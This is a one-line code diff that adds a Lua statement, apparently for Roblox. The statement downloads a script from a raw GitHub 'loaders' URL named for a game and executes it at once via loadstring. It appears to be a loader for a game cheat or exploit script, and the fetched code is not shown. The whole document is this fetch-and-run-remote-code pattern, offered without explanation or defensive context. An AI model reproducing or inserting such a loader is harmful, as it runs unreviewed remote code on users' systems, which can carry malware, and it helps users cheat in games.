@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/shoot-for-eggs-spam7-277d5aeigdvxz2.lua"))()
